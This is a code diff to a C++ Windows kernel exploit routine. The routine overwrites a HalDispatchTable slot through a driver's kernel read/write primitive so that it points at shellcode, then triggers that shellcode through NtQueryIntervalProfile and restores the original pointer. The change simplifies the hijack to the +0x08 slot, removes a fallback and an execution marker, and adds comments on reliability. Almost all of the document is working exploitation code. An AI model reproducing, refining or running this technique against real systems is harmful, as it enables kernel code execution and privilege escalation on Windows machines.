@@ -271,42 +271,30 @@ namespace ShieldDriver {
 
         printf("[*] HDT: HalDispatchTable @ 0x%llx\n", pHDT);
 
-        // Try slot +0x10 first (HalSetSystemInformation), fallback to +0x08
-        uint64_t slot = pHDT + 0x10;
+        // Use HDT+0x08 (HalQuerySystemInformation) with NtQueryIntervalProfile trigger
+        // This is the most reliable HDT slot across Windows versions
+        uint64_t slot = pHDT + 0x08;
         uint64_t orig = 0;
         if (!ReadKernel(hDevice, slot, &orig, sizeof(orig))) {
-            slot = pHDT + 0x08;
-            if (!ReadKernel(hDevice, slot, &orig, sizeof(orig))) {
-                printf("[!] HDT: can't read slot\n");
-                return false;
-            }
+            printf("[!] HDT: can't read slot +0x08\n");
+            return false;
         }
-
-        // Store original + shellcode, plus a marker at codeCave+128 to detect execution
-        uint64_t markerAddr = shellcodeAddr + 128;
-        uint64_t markerVal = 0xDEADBEEFCAFEBABEULL;
-        WriteKernel(hDevice, markerAddr, &markerVal, sizeof(markerVal));
         
         WriteKernel(hDevice, slot, &shellcodeAddr, sizeof(shellcodeAddr));
         Sleep(5);
 
-        BOOL ok = FALSE;
-        
-        // Method 1: NtQueryIntervalProfile (for +0x08 slot)
-        {
-            ULONG iv = 0;
-            auto fn = (NTSTATUS(NTAPI*)(ULONG, PULONG))GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQueryIntervalProfile");
-            if (fn) { fn(2, &iv); ok = TRUE; }
+        // Trigger: NtQueryIntervalProfile -> HalQuerySystemInformation -> our shellcode
+        ULONG iv = 0;
+        auto fn = (NTSTATUS(NTAPI*)(ULONG, PULONG))GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQueryIntervalProfile");
+        if (!fn) {
+            printf("[!] HDT: NtQueryIntervalProfile not found\n");
+            WriteKernel(hDevice, slot, &orig, sizeof(orig));
+            return false;
         }
         
-        // Method 2: NtSetSystemInformation (for +0x10 slot)
-        if (!ok) {
-            auto fn = (NTSTATUS(NTAPI*)(ULONG, PVOID, ULONG))GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtSetSystemInformation");
-            if (fn) {
-                __try { fn(0x2C, NULL, 0); } __except(EXCEPTION_EXECUTE_HANDLER) {}
-                ok = TRUE;
-            }
-        }
+        // Do NOT use __try - kernel exceptions from HDT are not catchable from usermode
+        // The sleep+write pattern ensures the callback completes before we restore
+        fn(2, &iv);
 
         Sleep(20);
         WriteKernel(hDevice, slot, &orig, sizeof(orig));
